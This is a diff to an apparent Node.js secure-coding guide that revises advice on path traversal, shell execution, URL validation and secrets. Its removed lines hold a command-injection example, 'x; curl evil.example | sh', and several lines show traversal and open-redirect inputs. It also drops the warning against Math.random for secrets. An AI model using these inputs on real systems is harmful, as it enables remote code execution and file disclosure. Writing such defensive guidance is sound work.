@@ -37,11 +37,11 @@ schema that rejects unknown keys. `node --disable-proto=delete` blocks the `__pr
 
 ## File paths
 
-- `path.join(root, input)` normalises `..` and happily leaves `root`; `path.resolve(root, '/etc/passwd')`
-  ignores `root` entirely.
-- `resolved.startsWith(root)` with root `/srv/app` accepts the sibling `/srv/app2`.
-- A symlink inside `root` that points outside passes every lexical check.
+- `path.resolve(root, '/etc/passwd')` ignores `root` entirely, and a symlink inside `root` that points
+  outside passes every lexical check, so resolve real paths before comparing.
 - Decode percent-encoding before checking: `%2e%2e%2f` is `../` once decoded.
+- `realpath` throws for a file that does not exist yet, so for a write, check the real path of the parent
+  directory and then join the validated file name.
 
 ```js
 import path from 'node:path';
@@ -59,9 +59,7 @@ in a path makes Node throw, so that old trick is gone.
 
 ## Running programs
 
-`exec` and any call with `shell: true` hand a string to the shell: `exec(\`convert ${name}\`)` with a
-name of `x; curl evil.example | sh` runs both. Use `execFile` or `spawn` with an argument array, and put
-`--` before user-supplied operands so a value starting with `-` is not read as an option. Node prints
+With `execFile` or `spawn` and an argument array, still put `--` before user-supplied operands so a value starting with `-` is not read as an option. Node prints
 deprecation `DEP0190` when arguments are passed together with `shell: true`, because they are joined,
 not escaped. On Windows, `.bat` and `.cmd` files need a shell, and Node refuses to spawn them without
 one.
@@ -91,16 +89,13 @@ backtracking is the cost, not a portable fix.
 
 ## URLs from input
 
-Parse, then decide on the parsed parts: `URL.parse(input, base)` returns `null` instead of throwing.
-Allow-list `protocol`, and for a redirect target compare `origin` with your own, because
-`//evil.example`, `/\evil.example` and `https://good.example@evil.example/` all point at another host. A
-server that fetches a user-supplied URL must also refuse private and loopback addresses after resolving
-the host, and re-check every redirect.
+`URL.parse(input, base)` returns `null` instead of throwing. Besides `//evil.example` and
+`/\evil.example`, `https://good.example@evil.example/` points at `evil.example`: decide on `url.origin`,
+never on a string prefix. A server that fetches a user-supplied URL must also refuse private and loopback
+addresses after resolving the host, and re-check every redirect.
 
 ## Secrets and randomness
 
-- `Math.random` is not cryptographic. Use `crypto.randomUUID()`, `crypto.getRandomValues`, or
-  `crypto.randomBytes`.
 - `===` on a secret leaks timing. `crypto.timingSafeEqual` throws on buffers of different lengths, so
   compare fixed-length digests: HMAC both values with the same key, then compare.
 - `eval`, `new Function` and `setTimeout(string)` run code from strings; `node
